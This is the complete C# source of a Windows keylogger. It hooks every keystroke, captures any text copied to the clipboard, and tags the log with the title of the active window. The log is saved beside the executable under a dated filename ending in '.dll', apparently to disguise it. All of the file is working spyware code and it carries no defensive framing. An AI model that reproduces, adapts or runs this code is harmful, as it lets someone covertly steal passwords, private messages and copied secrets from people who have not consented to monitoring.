using Keystroke.API;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using WK.Libraries.SharpClipboardNS;
using static WK.Libraries.SharpClipboardNS.SharpClipboard;

namespace Keylogger
{
    class Program
    {
        string log = string.Empty;
        string currentWindowTitle = string.Empty;

        //Get window titles
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [STAThread]
        static void Main(string[] args)
        {
            new Program().start();
        }


        private void start()
        {
            // Clipboard handler
            var clipboard = new SharpClipboard();
            clipboard.ObservableFormats.Texts = true;
            clipboard.ClipboardChanged += ClipboardChanged;


            // Key handler
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => 
                {
                    // Clean the key
                    string character2 = cleanKey(character.ToString());

                    // Get the foreground window's title : https://stackoverflow.com/questions/115868/how-do-i-get-the-title-of-the-current-active-window-using-c
                    string windowTitle = getForegroundWindowTitle();
                    if (windowTitle != currentWindowTitle && windowTitle != "")
                    {
                        currentWindowTitle = windowTitle;
                        log += $"\n\n<newForegroundWindow>{currentWindowTitle}</newForegroundWindow>\n";
                    }

                    // Update the log variable
                    log += character2;

                    // Write logs
                    writeLogs(log);
                });

                Application.Run();
            }
        }

        public string cleanKey(string character)
        {
            if (character == "<enter>") { character = "\n"; }
            return character;
        }
        
        public string getForegroundWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            string windowTitle = "";
            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                windowTitle = Buff.ToString();
            }
            return windowTitle;
        }

        
        private void ClipboardChanged(Object sender, ClipboardChangedEventArgs e)
        {
            if (e.ContentType == SharpClipboard.ContentTypes.Text)
            {
                log += "\n<newClipboardText>" + e.Content.ToString() + "</newClipboardText>\n";

                // Write logs
                writeLogs(log);
            }
        }

        public void writeLogs(string log)
        {
            // Write logs : https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
            string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
            string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
            File.WriteAllText(Path.Combine(path, fileName), log);

            //Console.WriteLine(log);
        }

    }

   
}
